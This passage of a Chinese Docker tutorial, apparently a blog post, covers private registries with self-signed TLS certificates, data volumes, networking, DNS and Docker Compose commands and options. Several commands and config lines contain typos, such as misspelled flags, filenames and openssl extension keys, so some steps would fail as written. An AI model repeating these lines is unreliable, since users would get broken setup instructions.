/var/lib/registry目录下，可以通过-v参数指定镜像文件存在本地的指定路径。例如下面的例子将上传的镜像放到本地的/opt/data/registry 1234docker run -d \ -p 5000:5000 -v /opt/data/registry:/var/lib/registry \ registry 上传、搜索、下载创建好私有仓库后，可以使用docker tag来标记一个镜像，然后将它推送到仓库，例如私有仓库地址为 127.0.0.1:5000,现在本机已有的镜像 123$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEubuntu latest ba5877dc9bec 6 weeks ago 192.7 MB docker tag将 ubuntu:latest镜像标记为 127.0.0.1:5000/ubuntu/:latest，格式为： docker tag IMAGE[:TAG] [REGISTRT_HOST[:REGISTRY_PROT]/]REGISTORY[:TAG] 12345docker tag ubuntu:latest 127.0.0.1:5000/ubuntu:latestdocker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEubuntu latest ba5877dc9bec 6 weeks ago 192.7 MB127.0.0.1:5000/ubuntu:latest latest ba5877dc9bec 6 weeks ago 192.7 MB docker push上传标记的镜像 123456789docker push 127.0.0.1:5000/ubtuntu:latestThe push refers to repository [127.0.0.1:5000/ubuntu]373a30c24545: Pusheda9148f5200b0: Pushedcdd3de0940ab: Pushedfc56279bbb33: Pushedb38367233d37: Pushed2aebd096e0e2: Pushedlatest: digest: sha256:fe4277621f10b5026266932ddf760f5a756d2facd505a94d2da12f4f52f71f5a size: 1568 curl查看仓库中的镜像 12curl 127.0.0.1:5000/v2/_catalog&#123;"repositories":["ubuntu"]&#125; 删除已有的镜像从私有仓库下载镜像 1234567891011121314docker image rm 127.0.0.1:5000/ubuntu:latestdocker pull 127.0.0.1:5000/ubuntu:latestPulling repository 127.0.0.1:5000/ubuntu:latestba5877dc9bec: Download complete511136ea3c5a: Download complete9bad880da3d2: Download complete25f11f5fb0cb: Download completeebc34468f71d: Download complete2318d26665ef: Download complete$ docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE127.0.0.1:5000/ubuntu:latest latest ba5877dc9bec 6 weeks ago 192.7 MB 注意事项如果不想使用 127.0.0.1:5000 作为仓库地址，比如想让本网段的其他主机也能把镜像推送到私有仓库。得把例如 192.168.199.100:5000 这样的内网地址作为私有仓库地址，这时会发现无法成功推送镜像。 这是因为 Docker 默认不允许非 HTTPS 方式推送镜像。通过 Docker 的配置选项来取消这个限制. Ubuntu 14.04, Debian 7 Wheezy对于使用 upstart 的系统而言，编辑 /etc/default/docker 文件，在其中的 DOCKER_OPTS 中增加如下内容： 1DOCKER_OPTS="--registry-mirror=https://registry.docker-cn.com --insecure-registries=192.168.199.100:5000" 重新启动服务。 1$ sudo service docker restart Ubuntu 16.04+, Debian 8+, centos 7对于使用 systemd 的系统，请在 /etc/docker/daemon.json 中写入如下内容（如果文件不存在新建该文件） 12345678&#123; "registry-mirror": [ "https://registry.docker-cn.com" ], "insecure-registries": [ "192.168.199.100:5000" ]&#125; 注意：该文件必须符合 json 规范，否则 Docker 将不能启动。 其他对于 Docker for Windows 、 Docker for Mac 在设置中编辑 daemon.json 增加和上边一样的字符串即可。 私有仓库高级配置利用Docker Compose 搭建一个拥有权限认证、TLS的私有仓库。新建一个文件夹，以下步骤在该文件夹镜像 准备站点证书国内各大云服务商提供免费的站点证书，也可以使用openssl自行签发证书。假设要搭建的私有仓库地址为docker.domain.com，使用openssl自行签发docker.domain.com的站点SSL证书 第一步创建CA私钥 openssl genrsa -out “root-ca.key” 4096 第二步利用私钥创建CA根证书请求文件 123456openssl req \ -new -key "root-ca.key" \ -out "root-ca.ssr" -sha256 \ -subj '/C=CN/ST/Shanxi/L=Datong/O=Your Company Name Name/CN=Your Company Name Docker Registry CA' # -subj参数里面的/C代表国家，/ST表示省，/L表示城市或者地区，/O表示组织名，/CN通用名称 第三步创建CA根证书新建root-ca.cnf 1234[root_ca]basicConstrains = critical,CA:TRUE,pathlen:1keyUsage = critical,nonRepudiation,cRLSign,keyCertSignsubjectKetIdentifier=hash 第四步签发根证书 1234openssl x509 -req -days 3650 -in "root-ca.csr" \ -signkey "root-ca.key" -sha256 -out "root-ca.crt" \ -extfile "root-ca.cnf" -extensions \ root_ca 第五步生成站点SSL私钥 1openssl genrsa -out "docker.domain.com.key" 4096 第六步使用私钥生成证书请求文件 12openssl req -new -key "docker.domain.docm.key" -out "site.csr" -sha256 \ -subject '/C=CN/ST=ShanXi/L=Datong/O=Your Company Name/CN=docker.domain.com' 第七步配置证书，新建site.cnf文件 1234567[server]authorityKeyIdentifier=keyid,issuerbasicConstraints = critilcal,CA:FALSEextendedKeyUsage=serverAuthKeyUsage = critical,digitalSignature,keyEnciphermentsubjectAltName = DNS:docker.domain.com,IP:127.0.0.1subjectKeyIdentifier=hash 第八步签署站点SSL证书 123openssl x509 -req -days 750 -in "site.csr" -sha256 \ -CA "root-ca.crt" -CAkey "root-ca.key" -CAcreateserial \ -out "docker.domain.com.crt" -extfile "site.cnf" -extensions server 这样就拥有了docker.domain.com的网站SSL私钥docker.domain.com.key和SSL证书docker.domain.com.crt以及CA根证书root-ca.crt 新建ssl文件夹将docker.domain.com.key、docker.domain.com.crt、root-ca.crt这三个文件移入，删除其他文件 配置私有仓库私有仓库默认的配置文件位于 /etc/docker/registry/config.yml，现在本地编辑 config.yml，之后挂载到容器中 12345678910111213141516171819202122232425262728293031323334version: 0.1log: accesslog: disabled: true level: debug formatter: text fields: service: registry environment: stagingstorage: delete: enabled: true cache: blobdescriptor: inmemory filesystem: rootdirectory: /var/lib/registryauth: htpasswd: realm:basic-realm path: /etc/docker/registry/auth/nginx.htpasswdhttp: addr: :443 host: http://docker.domain.com headers: X-Content-Type-Options: [nosniff] http2: disabled: false tls: certificate: /etc/docker/registry/ssl/docker.domain.com.crt key: /etc/docker/registry/ssl/docker.domain.com.keyhealth: storagedrive: true interval: 10sthreshold: 3 生成http认证文件123456mkdir authdocker run --rm \ --entrypoint htpasswd \ registry \ -Bbn username password &gt; auth/nginx.htpasswd# username password对应用户名和密码 编辑 docker-compose.yml 123456789101112version: '3'services: registry: image: registry ports: - "443:443" volumes: - ./:/etc/docker/registry - registry-data:/var/lib/registryvolumes: registry-data: 修改hosts编辑 /etc/hosts 1127.0.0.1 docker.domain.com 启动 1docker-compose up -d 这样就搭建好了一个具有权限认证、TLS的私有仓库。 由于自行签发的CA根证书不被系统信任，需要将CA根证书 ssl/root-ca.crt移入 etc/docker/certs.d/docker.domain.com文件夹中 12sudo mkdir -p /etc/docker/certs.d/docker.domain.comsudo cp ssl/root-ca.crt /etc/docker/certs.d/docker.domain.com/ca.crt 关键在于退出登录，尝试推送镜像 123docker logout docker.domain.comdocker push docker.domain.com/username/ubuntu:18.04no basic auth credentials 数据管理数据卷Volumes数据卷是一个可供一个或者多个容器使用的特殊目录，它绕过UFS,可以提供很多有用的特征： 数据卷可以在容器之间共享和重用 对数据卷的修改会立马生效 对数据卷的更新不会影响镜像 数据卷默认一直存在，即使容器被删除 数据的使用，类似于Linux下对目录或者文件进行mount，镜像中的被指定为挂载点的目录中的文件会隐藏掉，能显示看的是挂载的数据卷 创建一个数据卷12345678910111213141516docker volume create my-vol# 查看所有数据卷docker volume lslocal my-vol# 在主机里面使用以下命令可以查看指定数据卷的信息docker volume inspect my-vol[ &#123; "Driver": "local", "Labels": &#123;&#125;, "Mountpoint": "/var/lib/docker/volumes/my-vol/_data", "Name": "my-vol", "Options": &#123;&#125;, "Scope": "local" &#125;] 启动一个挂载数据卷的容器12345678# 用 docker run命令的时候，使用 --mount标记将数据卷挂载容器里。在一次docker run 中可以挂载多个数据卷# 创建一个名为web的容器，并加载一个数据卷到容器的/webapp没有来docker run -d - p \ --name web \ # -v my-vol:/wepapp \ --mount source=my-vol,target=/webapp \ training/webapp \ python app.py 查看数据卷的具体信息主机里面使用以下命令可以查看web容器的信息 1234567891011121314docker inspect web# 数据卷信息在Mounts Keys下面"Mounts": [ &#123; "Type": "volume", "Name": "my-vol", "Source": "/var/lib/docker/volumes/my-vol/_data", "Destination": "/app", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" &#125;], 删除数据卷1docker volume rm my-vol 数据卷是被设计用来持久化数据的，生命周期独立于容器，Docker不会在容器被删除后自动删除容器，并且也不会存在垃圾回收这样的机制来处理没有任何容器引用的数据卷。如果需要在删除容器的同时移除数据卷，可以再删除容器的时候使用 docker rm -v的命令 无主的数据卷可能会占据很多空间，清理可以使用： 1docker volume prune 挂载主机目录Bind mounts挂载一个主机目录作为数据卷1234567# 使用 --mount标记可以指定挂载一个本地主机的目录到容器中去docker run -d -P \ --name web \ # -v /src/webapp:/opt/webapp \ --mout type=bind,source=/src/webapp,target=/opt/webapp \ training/webapp \ python app.py 上面的命令加载主机的 /src/webapp目录到容器的 /opt/webapp目录，这个功能在进行测试比较方便，比如用户可以放置一些程序到本地目录中，来查看容器是否正常工作。本地目录的路径必须是绝对路径，使用 -v参数时如果本地目录不存在Docker会自动创建一个文件夹，使用 --mount采纳数如果本地目录不存在，Docker会报错 Docker挂载主机目录默认权限是读写，用户可以通过增加 readonly指定为只读 123456789docker run -d -p \ --name web \ # -v /src/webapp:/opt/webapp:ro \ --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \ training/webapp \ python app.py# 加了 readonly之后就挂载为只读，在容器内 /opt/webapp目录创建文件，会显示错误/opt/webapp # touch new.txttouch: new.txt: Read-only file system 查看数据卷的具体信息在主机里查看web容器的信息 123456789101112docker inspect web # 挂载主机目录的配置信息在Mounts Key下面"Mounts": [ &#123; "Type": "bind", "Source": "/src/webapp", "Destination": "/opt/webapp", "Mode": "", "RW": true, "Propagation": "rprivate" &#125;], 挂载一个本地主机文件作为数据卷 --mount标记也可以从主机挂载单个文件到容器中 1234567891011docker run --rm -it \ # -v $HOME/.bash_history:/root/.bash_history \ --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \ ubuntu:17.10 \ bash root@2affd44b4667:/# history1 ls2 diskutil list #这样可以记录在容器输入过的命令 使用网络外部访问容器容器中可以运行一些网络应用，让外部也可以访问，可以通过 -P/p参数来指定端口映射 当使用-P，Docker会随机映射一个 49000~49900的端口到内部容器开放的端口 12345678910docker run -d -p training/webapp python app.pydocker container ls -lCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESbc533791f3f5 training/webapp:latest python app.py 5 seconds ago Up 2 seconds 0.0.0.0:49155-&gt;5000/tcp nostalgic_morse# 本地主机的49155被映射到容器的5000端口，此时访问本机的49155端口既可以访问容器内web应用提供的界面# 可以通过docker logs命令查看应用的信息docker logs -f nostalgic_morss* Running on http://0.0.0.0:5000/10.0.2.2 - - [23/May/2014 20:16:31] "GET / HTTP/1.1" 200 -10.0.2.2 - - [23/May/2014 20:16:31] "GET /favicon.ico HTTP/1.1" 404 - -p则可以指定要映射的端口，并且在一个指定端口上只可以绑定一个容器。支持的格式为： ip:hostPort:containerPort|ip::containerPort|hostPort:containerPort 123456789101112131415161718# 映射所有接口地址:使用 hostPort:containerPort格式本地的5000端口映射到容器的5000端口，此时会默认绑定本地所有接口上的所有地址docker run -d -p 5000:5000 training/webapp python app.py#映射到指定地址的指定端口：ip:hostPort:containerPort映射使用一个特定地址，比如localhost地址127.0.0.1docker run -d -p 127.0.0.1::5000 training/webapp python app.py# 使用udp来指定udp端口docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py# 查看映射端口配置:docker port，还可以查到绑定的地址docker port nostalgic_morse 5000127.0.0.1:49155 .# 容器有自己的内部网络和ip地址，-p标记可以多次使用来绑定多个端口docker run -d \ -p 5000:5000 \ -p 3000:80 training/webapp \ python app.py 容器互联随着Docker网络的完善，将容器加入自定义Docker网络来连接多个容器的做法优于使用 --link参数 新建网络12# 创建一个新的Docker网络，-d参数指定Docker网络类型，有bridge overlay，其中overlay网络类型适用于Swarm modedocker network create -d bridge my-net 链接容器12345678910111213141516171819202122232425# 运行一个容器并连接到新建的my net网络docker run -it --rm --name busybox1 --network my-net busybox sh# 打开新的终端，再运行一个容器加入到my-net网络docker run -it --name busybox2 --newwork my-net busybox sh# 再打开一个新的终端查看容器信息docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb47060aca56b busybox "sh" 11 minutes ago Up 11 minutes busybox28720575823ec busybox "sh" 16 minutes ago Up 16 minutes busybox1#通过 ping来证明busybox1容器和busybox2容器建立了互联关系，在busybox1容器输入以下命令/ # ping busybox2PING busybox2 (172.19.0.3): 56 data bytes64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms# 用ping来测试连接busybox2容器，会被解析成172.19.0.3，同理busybox2容器执行 ping busybox1，也会成功连接到/ # ping busybox1PING busybox1 (172.19.0.2): 56 data bytes64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms# 这样busybox1和busybox2容器就建立互联关系 如果有多个容器之间需要互相连接，推荐使用Docker compose 配置DNSDocker利用虚拟文件来挂载容器的3个相关配置文件 在容器中使用 mount命令可以看到挂载信息。 这种机制可以让宿主主机DNS信息发生更新后，所有Docker容器的DNS配置通过 /etc/resolv.conf文件立刻得到更新。 配置全部容器的DNS，可以在/etc/docker/daemon.json文件中增加以下内容来设置 123456&#123; "dns":[ "114.114.114.114", "8.8.8.8" ]&#125; 这样每次启动容器DNS自动配置为114.114.114.114和 8.8.8.8。证明已经生效： 1234docker run -it --rm ubuntu:18.04 cat etc/resolv.confnameserver 114.114.114.114nameserver 8.8.8.8 如果用户想要手动指定容器的配置，可以在使用docker run的时候加入参数： -h HOSTNAME/--hostname=HOSTNAME设定容器的主机名，它会被写到容器内的etc/hostname和/etc/hosts，在容器外部看不到，既不会在docker container ls中显示，也不会在其他容器 /etc/hosts看到。 --dns=IP_ADDRESS添加DNS服务器到容器的/etc/resolv.conf中，让容器用这个服务器来解析所有不在 /etc/hosts中的主机名 --dns-search=DOMAIN设定容器的搜索域，当设定搜索域为 .example.com时，在搜索一个名为host的主机，DNS不仅搜索host，还会搜索host.example.com 如果在容器启动时没有指定最后两个参数，Docker会默认用主机上的 resolve.conf配置容器 Docker Compose项目Docker Compose是Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用。 Compose定位是定义和运行多个Docker容器的应用。 使用一个Dockerfile模板文件可以很方便定义一个单独的容器，但经常会碰到需要多个容器互相配合来完成某项任务的情况，要实现一个Web项目，除了Web服务容器本身，玩玩还要加上后端的数据库服务容器，甚至负载均衡容器等。 Compose运行用户通过一个单独的docker-cmpose.yml模板文件来定义一组相关联应用容器为一个项目 Compose中有两个重要的概念： 服务service：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例 项目project：由一组关联的应用容器组成一个完整业务单元，在docker-compose.yml文件中定义 Compose的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷的生命周期管理 Compose项目由Python编写，实际上调用了Docker服务提供的API来对容器进行管理，因此只要所操作的平台支持Docker Api，就可以在其上利用Compose进行编排管理 使用场景常见的Web网络，该项目包含web应用和缓存，下面使用Python记录页面次数的web网站 app.py 1234567891011121314# dockerTest/app.pyfrom flask import Flaskfrom redis import Redisapp = Flask(__name__)redis = Redis(host='redis', port=6379)@app.route('/')def hello(): count = redis.incr('hits') return 'Hello World! 该页面已被访问 &#123;&#125; 次。\n'.format(count)if __name__ == "__main__": app.run(host="0.0.0.0", debug=True) Dockerfile 12345FROM python:3.6-alpineADD . /codeWORKDIR /codeRUN pip install redis flaskCMD ["python", "app.py"] docker-compose.yml 12345678910version: '3'services: web: build: . ports: - "5000:5000" redis: image: "redis:alpine" 运行 1docker-compose up 此时访问本地5000端口，每次刷新页面，计数就会增加1. 如果想要后台运行加 -d 命令说明命令对象与格式对于Compose来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有服务都会受到命令影响。 docker-compose [COMMAND] --help或者 docker-compose help [COMMAND]可以查看具体某个命令的使用格式，基本的使用格式是： 1docker-compose [-f=&lt;arg&gt;...] [options] [COMMAND] [ARGS...] 命令选项 -f,--file FILE指定使用的Compose模板文件，默认是docker-compose.yml，可以多次指定 -p,--project-name NAME指定项目名称，默认将使用所在目录名称作为项目名 --x-networking使用Docker的可拔插网络后端特性 --x-network-driver DRIVER指定网络后端的驱动，默认为bridge --verbose输出更多调试信息 -v,--version打印版本并退出 命令使用说明build 格式： docker-compose build [options] [SERVICE…] 构建（重新构建）项目中的服务容器。服务容器一旦构建后，将会带上一个标记名，对于web项目中的一个db容器，可能是web_db 可以随时在项目目录下运行 docker-compose build来重新构建服务 选项包括： --force-rm删除构建过程中的临时容器 --no-cache构建镜像过程中不使用cache(将加大构建过程) --pull始终尝试通过pull来获取更新版本的镜像 config 验证Compose 文件格式是否正确，若格式错误显示原因 down 此命令会停止up命令所启动的容器，并移除网络 exec 进入指定容器 help 获得命令的帮助 images 列出Compose文件中包含的镜像 kill 格式： docker-compose kill [options] [SERVICE…] 通过发送SIGKILL信号来强制停止服务容器。支持通过-s参数来指定发送信号： 1docker-compose kill -s SIGINT logs 格式： docker-compose logs [options] [SERVICE…] 查看服务容器的输出。默认情况下，docker-compose将对不同的服务输出使用不同的颜色来区分，可以通过 --no-color来关闭颜色 pause 格式： docker-compose pause [SERVICE…] 暂停一个服务容器 port 格式： docker-compose port [option] SERVICE PRIVIATE_PORT 打印某个容器端口所映射的公共端口 选项： --protocol=proto指定端口协议，tcp默认值或者udp --index=index如果同一服务存在多个容器，指定命令对象容器的序号（默认为1） ps 格式： docker-compose ps [options] [SERVICE…] 列出项目中目前的所有容器 选项： -q只打印容器的ID信息 pull 格式： docker-compose pull [options] [SERVICE…] 拉取服务依赖的镜像 选项： --ignore-pull-failures忽略拉取镜像过程中的错误 push 推送服务依赖的镜像到Docker镜像仓库 restart 格式： docker-compose restart [options] [SERVICE…] 重启项目中的服务。 选项： -t,--timeout TIMEOUT指定重启前停止容器的超时（默认为10秒） rm 格式 docker-compose rm [options] [SERVICE…] 删除所有停止状态服务容器，推荐先指定docker-compose stop命令来停止容器 选项： -f,--force强制直接删除，包括非停止状态的容器，一般尽量不要使用该选项 -v删除容器所挂载的数据卷 run 格式： docker-compose run [options] [-p PORT…] [-e KEY=VAL…] SERVICE [COMMAND] [ARGS…] 在指定服务上执行一个命令 1docker-compose run ubuntu ping docker.com 将会启动一个ubuntu服务容器，并执行ping docker.com命令 默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中 该命令类似启动容器后执行指定的命令，相关卷、链接等等都会按照配置自动创建 两个不同点：给定命令将会覆盖原有的自动运行命令，不会自动创建端口，以避免冲突 如果不希望自动启动关联的容器，可以使用 --no-deps选项，例如 1docker-compose run --no-deps web python manage.py shell 将不会启动web容器所关联的其他容器 选项： -d后台运行容器 --name NAME为容器指定一个名字 --entrypoint CMD覆盖默认的容器启动指令 -e KEY=VAL设置环境变量值，可多次使用选项来设置多个环境变量 -u,--user=&quot;&quot;指定运行容器的用户名或者uid --no-deps 不自动启动关联的服务容器 --rm 运行命令后自动删除容器，d默认下将忽略 -p,--publish=[] 映射容器端口到本地主机 --service-ports 配置服务端口并映射到本地主机 -T 不分配伪tty，意味着依赖tty的指令将无法运行 scale 格式: docker-compose scale [options] [SERVICE=NUM…] 设置指定服务运行的容器个数 通过service-num的参数来设置数量。例如 1docker-compose scale web=3 db=2 start 格式： docker-compose start [SERVIC…] 启动已经存在的服务器 stop 格式： docker-compose stop [options] [SERVICE…] 停止已经处于运行状态的容器，但不删除它，通过 docker-compose start可以再次启动这些容器 top 查看各个服务容器内运行的内存 unpause 格式： docker-compose unpause [SERVICE…] 恢复处于暂停状态的服务 up 格式： docker-compose up [options] [SERVICE…] 尝试自动完成包括构建镜像，重新创建服务，启动服务，并关联服务相关容器的一系列操作。链接的服务器都会被自动启动，除非已经处于运行状态 大部分时候都可以通过该命令来启动一个项目 默认情况下，docker-compose up启动的容器在前台，控制台将会同时打印所有容器的信息，可以方便调试，使用 ctrl-c停止命令时，所有容器将会停止 生产环境推荐使用 docker-compose up -d，这将会在后台启动并运行所有容器。 默认情况下，如果服务容器已经存在，docker-compose up将会尝试停止容器，然后重新创建（保持使用volume-from挂载的卷），以保证新的服务匹配docker-compose.yml文件的最新内容。如果不希望容器被停止并重新创建，可以使用 docker-compose up –no-recreate。这样只会启动处于停止状态的容器，而忽略已经运行的服务，如果用户只想重新部署某个服务，可以使用 docker-compose up --no-deps -d &lt;SERVICE_NAME&gt;来重新创建服务并后台停止旧服务，启动新服务，并不会影响到期所依赖的服务。 选项： -d在后台运行服务容器 --no-color不使用颜色来区分不同的服务的控制台输出 --no-deps不启动服务所链接的容器 --force-recreate强制重新创建容器，不能与--no-recreate同时使用 --no-buld不自动构建缺失的服务镜像 -t,timeout TIMEOUT`停止同期时候的超时（默认为10秒） version 打印版本信息 模板文件模板文件就是使用compose的核心，大部分指令跟docker run相关参数的含义类似 默认的模板文件名称为 docker-compose.yml，格式为YAML格式 123456789version: "3"services: webapp: image: example/web ports: - "80:80" volumes: - "/data" 每个服务都必须通过image指令指定镜像或build（需要Dockerfile）指令等来自动构建生成镜像 如果使用build命令，在Dockerfile中设置的选项，例如CMD/EXPOSE/VOLUME/ENV等将会被自动获取，无需在docker-compose.yml中再次设置。 build指定Dockerfile所在文件夹的路径（可以是绝对路径，或者相对docker-compose.yml文件路径），Compose将会利用它自动构建这个镜像，然后使用这个镜像 1234version: '3'services: webapps: build: ./dir 也可以使用context指令指定Dockerfile所在文件夹的路径，dockerfile指令指定Dockerfile文件名，arg指令指定构建镜像时的变量 12345678version: '3'services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 使用cache_from指定构建镜像的缓存 12345build: context: . cache_from: - alpine:latest - corp/web_app:3.14 cap_add,cap_drop指定容器的内核能力（capacity）分配 123456# 让容器拥有所有能力cap_add: - ALL# 去掉 NET_ADMIN能力cap_drop: - NET_ADMIN configs、deploy仅用于Swarm mode cgroup_parent指定父cgroup组，意味着将继承改组的资源限制 12# 创建一个cgroup组名称为cgroups_1cgroup_parent: cgroups_1 container_name指定容器名称。默认使用项目名称_服务名称_序号 12container_name:docker-web-container# 指定容器名称后，该服务将无法进行扩展（scale）,因此Docker不会允许多个容器具有相同的名称 devices指定设备映射关系 12devices: - "/dev/ttyUSB1:/dev/ttyUSB0" depends_on解决容器的依赖、启动先后问题。 1234567891011121314# 先启动redis db 再启动webversion: '3'services: web: build: . depends_on: - db - redis redis: image: redis db: image:postgres# web服务不会等待redis db完全启动之后才启动 dns自定义DNS服务器，可以是一个值，也可以是一个列表 1234dns: 8.8.8.8dns: - 8.8.8.8 - 114.114.114.114 dns_search配置DNS搜索域，可以是一个值，也可以是一个列表 12345dns_search:example.comdns_search: - domain1.example.com - domain2.example.com tmpfs挂载一个tmpfs文件系统到容器 1234tmpfs: /runtmpfs: - /run - /tmp env_file从文件中获取环境变量，可以为单独的文件路径或列表 通过 docker-compose -f FILE方式来指定Compose模板文件，则 env_file中变量的路径会基于模板文件路径。如果有变量名称与environment指令冲突，则按照惯例，以后者为准 123456env_file: .envenv_file: - ./common.env - ./apps/web.env - /opt/secrets.env 环境变量文件中每一行必须符合格式，支持#开头的注释行 12# common.env: Set development environmentFROG_ENV=development environment设置环境变量，可以使用数组和字典两种格式 只给定名称的变量会自动获取运行Compose主机上对应变量的值，可以用阿里防止泄露不必要的数据 12345678environment: RACK_ENV: development SESSION_SECRET:environment: - RACK_ENV=development - SESSION_SECRET 如果变量名称或者值中用到true|false,yse|no等表示布尔含义的词汇，最好放到引号中，避免YAML自动解析某些内容为对应的布尔语义，这些特定词汇，包括 1y|Y|Yes|YES|n|N|no|NO|true|True|TRUE|false|False|FALSE|on|ON|off|Off|OFF expose暴露端口，但不映射到宿主机，只被连接的服务访问。仅可以指定内部端口为参数 123expose: - "3000" - "8000" external_links链接到docker-compose.yml外部的容器，甚至并非Compose管理的外部容器，不建议使用 1234external_links: - redis_1 - project_db_1:mysql - project_db_1:postgresql extra_hosts类似Docker中的--add-host参数，指定额外的host名称映射信息 123extra_hosts: - "googledns:8.8.8.8" - "dockerhub:52.1.157.61" 会在启动后的服务容器中 /etc/hosts文件中添加如下两条条目 128.8.8.8 googledns52.1.157.61 dockerhub healthcheck通过命令检查容器是否健康运行 12345healthcheck: test: ["CMD","curl","-f","http://localhost"] interval: 1m30s timeout: 10s retries: 3 image指定为镜像名称或者镜像ID,如果镜像在本地不存在，Compose将会尝试拉取这个镜像 123image: ubuntuimage: orchardup/postgresqlimage: a4bc65fd labels为容器添加Docker元数据（metadata）信息，可以为容器添加辅助说明信息 1234labels: com.startupteam.description: "webapp for a startup team" com.startupteam.department: "depvops department" com.startupteam.release: "rc3 for v1.0" links不推荐使用该指令 logging配置日志选项 1234567891011121314loggin: driver: syslog options: syslog-address: "tcp://192.168.0.42:123"# 目前支持三种日志驱动类型driver: "json-file"driver: "syslog"driver: "none"# options配置日志驱动的相关参数options: max-size: "200k" max-file: "10" network_mode设置网络模式，使用和 docker run 的 network参数一样的值 12345network_mode: "bridge"network_mode: "host"network_mode: "none"network_mode: "service:[service name]"network_mode: "container:[container name/id]" networks配置容器连接的网络 12345678910version: "3"services: some-service: networks: - some-network - other-networknetworks: some-network: other-network: pid跟主机系统共享进程命名空间，打开该选项的容器之间，以及容器和宿主机系统之间可以通过进程ID来互相访问和操作 1pid: "host" ports暴露端口信息 使用宿主端口：容器端口（HOST:CONTAINER）格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以 1234567ports: - "3000" - "8000:8000" - "49100:22" - "127.0.0.1:8001:8001"# 当使用 HOST:CONTAINER格式映射端口时，使用的容器端口小于60并且没有放到引号里，可能会得到错误结果，因为YAML会自动解析xx:yy，这种数字格式为60进制，为避免出现这个问题，建议数字串都采用引号包括起来的字符串格式 secrets存储敏感数据，例如mysql服务密码 12345678910111213141516version: "3.1"services：mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password secrets: - db_root_password - my_other_secret secrets: my_secret: file: ./my_secret.txt my_other_secret: external: true security_opt指定容器模板标签label机制的默认属性（用户、角色、类型、级别等）。例如配置标签的用户名和角色名 123security_opt: - label:user:USER - label:role:ROLE stop_signal设置另一个信号来停止容器。在默认情况下使用的是SIGTERM停止容器 1stop_signal: SIGUSR1 sysctls配置容器内核参数 1234567sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0 sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 ulimits指定容器的ulimits限制值 例如，指定最大容器的进程数为65535.指定文件句柄数为20000（软限制，应用可以随时修改，不能超过硬限制）和40000（系统硬限制，只能root用户提高） 12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes数据卷所挂载路径设置，可以设置宿主主机路径（HOST:CONTAINER）或加上访问模式（HOST:CONTAINER:ro） 该指令中路径支持相对路径 1234volumes: - /var/lib/mysql - cache/:tmp/cache - ~/configs:/etc/configs/:ro 其他指令domainname,entrypoint,hostname,ipc,mac_address,privileged,read_only,shm_size,restart,stdin_open,tty,user,wor等指令，基本跟 docker run中对应参数的功能一致 12345678910111213141516171819202122232425262728# 指定服务容器启动后执行的入口文件entrypoint: /code/entrypoint.sh# 指定容器中运行应用的用户名user: nginx# 指定容器中工作目录working_dir: /code# 指定容器中搜索域名、主机名、mac地址等domainname: your_website.comhostname: testmac_address: 08-00-27-00-0C-0A# 允许容器中运行一些特权命令privileged: true# 指定容器退出后的重启策略为始终重启。该命令对保持服务始终运行十分有效，在生产环境中推荐配置为always或者unless-stoppedrestart: always# 只读模式挂载容器的 root 文件系统，意味着不能对容器内容进行修改read_only: true# 打开标准输入，可以接受外部输入stdin_open: true# 模拟一个伪终端tty: true 读取变量Compose模板文件支持动态读取主机的系统环境变量和当前目录下的 .env文件中的变量 例如，下面的Compose文件将从运行它的环境中读取变量 ${MONGO_VERSION}的值，并写入执行的指令中 12345verison: '3'services:db: image: "mongo:$&#123;MONGO_VERSION&#125;" 如果执行 MONGO_VERSION=3.2 docker-compose up 则会启动一个 mongo:3.2 镜像的容器；如果执行 MONGO_VERSION=2.8 docker-compose up 则会启动一个 mongo:2.8 镜像的容器。 若当前目录存在 .env 文件，执行 docker-compose 命令时将从该文件中读取变量。 在当前目录新建 .env 文件并写入以下内容。 12# 支持 # 号注释MONGO_VERSION=3.6 执行 docker-compose up 则会启动一个 mongo:3.6 镜像的容器。]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJs回顾]]></title>
    <url>%2F2020-06-19-NodeJS%E5%9B%9E%E9%A1%BE.html</url>
